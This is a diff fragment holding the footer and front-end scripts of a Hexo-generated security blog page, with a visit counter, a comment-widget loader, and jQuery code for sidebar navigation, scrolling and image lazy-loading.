+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
